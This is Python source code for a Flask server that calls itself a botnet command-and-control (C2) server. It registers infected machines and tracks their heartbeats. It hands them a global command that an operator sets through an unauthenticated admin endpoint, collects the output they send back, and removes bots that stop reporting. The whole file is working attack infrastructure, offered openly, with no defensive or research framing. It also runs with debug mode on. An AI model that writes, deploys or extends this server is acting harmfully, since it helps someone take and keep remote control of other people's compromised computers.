
from flask import Flask, request, jsonify
import threading
import time

app = Flask(__name__)

botnet_status = {}
current_global_command = {"command": "idle", "data": None}

@app.route('/register', methods=['POST'])
def register_bot():
    bot_id = request.remote_addr  
    hostname = request.json.get('hostname', 'Unknown')
    botnet_status[bot_id] = {
        'hostname': hostname,
        'last_seen': time.time(),
        'status': 'Active'
    }
    print(f"[+] New bot registered: {bot_id} ({hostname})")
    print(f"[+] Total bots: {len(botnet_status)}")
    return jsonify({"status": "ok"})

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    bot_id = request.remote_addr
    if bot_id in botnet_status:
        botnet_status[bot_id]['last_seen'] = time.time()
    return jsonify({"status": "ok"})

@app.route('/get_command', methods=['GET'])
def get_command():
    bot_id = request.remote_addr
    
    
    return jsonify(current_global_command)

@app.route('/submit_result', methods=['POST'])
def submit_result():
    bot_id = request.remote_addr
    result = request.json.get('result')
    print(f"[+] Result from {bot_id}:\n{result}")
    return jsonify({"status": "received"})

@app.route('/admin/command', methods=['POST'])
def admin_command():
    global current_global_command
    new_command = request.json.get('command')
    command_data = request.json.get('data', None)
    
    current_global_command = {
        "command": new_command,
        "data": command_data
    }
    print(f"[+] Global command updated to: {new_command} with data: {command_data}")
    return jsonify({"status": "command set"})

def cleaner_thread():
    while True:
        time.sleep(30)
        current_time = time.time()
        bots_to_remove = []
        for bot_id, bot_data in botnet_status.items():
            if current_time - bot_data['last_seen'] > 60: 
                bots_to_remove.append(bot_id)
        for bot_id in bots_to_remove:
            print(f"[-] Removing inactive bot: {bot_id}")
            del botnet_status[bot_id]

if __name__ == '__main__':
    
    cleaner = threading.Thread(target=cleaner_thread, daemon=True)
    cleaner.start()
    
    print("[+] C2 Server starting on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=True)